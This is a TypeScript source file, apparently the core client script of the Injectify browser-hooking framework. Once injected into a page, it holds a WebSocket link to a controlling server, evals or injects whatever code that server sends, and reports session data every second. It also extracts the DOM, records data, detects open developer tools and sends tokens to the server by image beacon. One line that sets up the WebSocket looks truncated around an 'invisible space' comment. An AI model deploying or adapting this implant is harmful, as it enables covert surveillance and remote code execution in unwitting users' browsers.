console.log(document.currentScript)
import { Injectify } from '../definitions/core'
declare let require, process: any
const ws: WebSocket = (<any>window).ws || (<any>window).i‍// <- invisible space

// Components
import Modules from './components/Modules'
import WindowInjection from './components/WindowInjection'
import Console from './components/Console'
import DOMExtractor from './components/DOMExtractor'
import DevtoolsListener from './components/Devtools/Listener'
import Websockets from './components/Websockets'
import DataRecorder from './components/DataRecorder'
import { Info, SessionInfo } from './components/Info'

// Libraries
import LoadJS from './lib/LoadJS'
import ErrorGuard from './lib/ErrorGuard'

// Polyfills
import Promise from './lib/Promise'

ErrorGuard(() => {
  let reconnected = !!window['injectify']

  /**
   * Injectify core API
   * @class
   */
  window['injectify'] = class Injectify {
    /**
     * Console logging
     */
    static log = Console.log
    static warn = Console.warn
    static error = Console.error
    static result = Console.result
    static table = Console.table
    static console = Console.hook

    /**
     * Data recorder
     */
    static record = DataRecorder.record

    /**
     * Devtools monitoring
     */
    static devtools = {
      open: false,
      orientation: null
    }
    static DevtoolsListener = DevtoolsListener

    /**
     * Websocket functions
     */
    static listener = Websockets.listener
    static listen = Websockets.topics.listen
    static unlisten = Websockets.topics.unlisten
    static send = Websockets.send
    static ping = Websockets.ping

    static exec(func, element: any = document.head) {
      if (this.info.platform === 'browser') {
        /**
         * Turn the function into a self-executing constructor
         */
        if (typeof func === 'function')
          func = '(function(){' + func.toString() + '})()'
        /**
         * Create, append & remove a script tag
         */
        let script = document.createElement('script')
        script.innerHTML = func
        element.appendChild(script)
        element.removeChild(script)
      } else {
        if (typeof func === 'string') {
          eval(`(${func})()`)
        } else {
          func()
        }
      }
    }

    static get DOMExtractor() {
      return DOMExtractor()
    }

    /**
     * Module loader
     */
    static module = Modules.loadModule
    static app = Modules.loadApp

    static LoadJS = LoadJS

    static auth(token?: string) {
      let auth = new Image()
      if (token) {
        auth.src = `${this.info.server.url}/a?id=${encodeURIComponent(
          this.info.id && this.info.id.toString()
        )}&token=${encodeURIComponent(token)}&z=${+new Date()}`
      } else {
        /**
         * Send a connection request to the server
         *
         * 1. Make a request to /a with our socket connection ID
         * 2. Server reads cookies and attempts to find our token
         * 3. If it can't be found it, the server sets a new cookie
         * 4. Server gets the passed socket ID and inserts us into database
         * 5. All this is done server-side with the below two lines
         */
        auth.src = `${this.info.server.url}/a?id=${encodeURIComponent(
          this.info.id && this.info.id.toString()
        )}&z=${+new Date()}`
      }
      /**
       * Make sure request is sent
       */
      auth.onload
    }

    /**
     * Info
     */
    static get info() {
      return Info()
    }
    static session = SessionInfo
    static connectTime = +new Date()

    static get debug(): boolean {
      return ws.url.split('?')[1].charAt(0) == '$'
    }

    static debugLog(
      internalName: string = 'generic',
      level: 'info' | 'debug' | 'warn' | 'error' = 'debug',
      ...message: any[]
    ): void {
      if (!this.debug) return
      let emoji = '📝'
      switch (internalName) {
        case 'websockets':
          emoji = '📶'
          break
        case 'core':
          emoji = '⚡️'
          break
        case 'module':
          emoji = '📦'
          break
        case 'window-injection':
          emoji = '💉'
          break
        case 'page-ghost':
          emoji = '👻'
          break
        case 'session-info':
          emoji = '🕵🏼'
          break
        case 'rate-limiter':
          emoji = '📛'
          break
      }

      message.unshift(
        `${emoji} [${internalName
          .split('-')
          .join(' ')
          .replace(/\w\S*/g, function(txt) {
            return txt.charAt(0).toUpperCase() + txt.substr(1).toLowerCase()
          })}]:`
      )

      if (internalName === 'core') {
        message = [
          `%c %c${emoji} Injectify core.ts loaded! => https://github.com/samdenty99/injectify`,
          `padding: 3px 10px; line-height: 20px; background: url("https://github.com/samdenty99/injectify/blob/master/assets/injectify.png?raw=true"); background-repeat: no-repeat; background-size: 20px 20px; color: transparent;`,
          ``,
          injectify.info
        ]
      }
      console[level].apply(this, message)
    }

    static get duration(): number {
      let duration = (+new Date() - this['connectTime']) / 1000
      return Math.round(duration)
    }

    static get global(): Injectify.global {
      if (!(<any>window).inJl1)
        (<any>window).inJl1 = {
          listeners: {
            visibility: false,
            timed: {
              active: false,
              timer: null
            },
            pinger: null,
            devtools: false,
            websocket: {}
          },
          windowInjection: false,
          commandHistory: [],
          modules: {
            states: {},
            calls: {}
          },
          scroll: {
            order: -1,
            id: null,
            x: -1,
            y: -1
          }
        }
      return (<any>window).inJl1
    }

    static setState(newState: any) {
      this.global
      Object.keys(newState).forEach((state) => {
        window['inJl1'][state] = newState[state]
      })
    }
  }

  /**
   * Create local reference to window.injectify
   */
  let injectify: typeof Injectify = window['injectify']

  // @ts-ignore
  let global = ((<any>window).global = injectify.global)

  /**
   * Re-connect events
   */
  if (reconnected) {
    injectify.debugLog(
      'websockets',
      'info',
      'Re-established a connection to the server ✅'
    )
  } else {
    window.dispatchEvent(new CustomEvent('injectify'))
  }

  /**
   * Debug helpers
   */
  /// #if DEBUG
  injectify.debugLog(
    'core',
    'warn',
    'Injectify core.ts loaded! => https://github.com/samdenty99/injectify',
    injectify.info
  )
  /// #endif

  /**
   * Window injection
   */
  if (!global.windowInjection) new WindowInjection()

  /**
   * Replace the basic websocket handler with a feature-rich one
   */
  injectify.listener((data, topic) => {
    switch (topic) {
      case 'stay-alive': {
        break
      }
      case 'rate-limiter': {
        injectify.debugLog(
          'rate-limiter',
          'error',
          `Could not complete request!`,
          data
        )
        break
      }
      case 'error': {
        if (injectify.debug)
          injectify.exec(`console.error(${JSON.stringify(data)})`)
        break
      }
      case 'module': {
        new Modules.loader(data)
        break
      }
      case 'execute': {
        ;(() => {
          let history = injectify.global.commandHistory
          history.push(data)
          injectify.setState({
            commandHistory: history
          })
        })()
        ErrorGuard(() => {
          injectify.result(eval(data))
        })
        break
      }
      case 'scroll': {
        let x = data[0]
        let y = data[1]
        let id = data[2]
        let order = data[3]
        if (injectify.global.scroll.order < order) {
          let element = document.querySelector(`[_-_=${JSON.stringify(id)}]`)
          if (element) {
            element.scrollTop = y
            element.scrollLeft = x
          }
          injectify.global.scroll = {
            ...injectify.global.scroll,
            x,
            y,
            id,
            order
          }
        }
        break
      }
      case 'core': {
        eval(data)
        break
      }
      default: {
        break
      }
    }
  })

  /**
   * Page Visibility API
   */
  ;(() => {
    if (injectify.info.platform === 'browser') {
      /**
       * Make sure it's not already listening
       */
      if (global.listeners.visibility) return
      /**
       * Set a global variable to prevent listener from being called multiple times
       */
      global.listeners.visibility = true

      let listener
      let focusChange = () => injectify.session.send()

      /**
       * Get the correct hidden listener
       */
      if ('hidden' in document) {
        listener = 'visibilitychange'
      } else if ('mozHidden' in document) {
        listener = 'mozvisibilitychange'
      } else if ('webkitHidden' in document) {
        listener = 'webkitvisibilitychange'
      } else if ('msHidden' in document) {
        listener = 'msvisibilitychange'
      } else {
        window.onpageshow = window.onpagehide = window.onfocus = window.onblur = focusChange
      }
      /**
       * Add listener
       */
      if (listener) document.addEventListener(listener, focusChange)
    }
  })()

  /**
   * Console.log overrider
   * Disabled as it can lock up the server - eg. hacked module
   */
  // injectify.console(true);

  /**
   * Devtools listener
   */
  injectify.DevtoolsListener()

  /**
   * Session info logger
   */
  ;(() => {
    if (global.listeners.timed.active) {
      return
    } else {
      global.listeners.timed.active = true
      ;(function sessionInfo() {
        clearTimeout(global.listeners.timed.timer)
        injectify.session.send()
        global.listeners.timed.timer = setTimeout(sessionInfo, 1000)
      })()
    }
  })()

  /**
   * Ping the server every 10 seconds to sustain the connection
   */
  if (!injectify.global.listeners.pinger) {
    injectify.global.listeners.pinger = setInterval(() => {
      injectify.send('heartbeat')
    }, 10 * 1000)
  }
}, true)
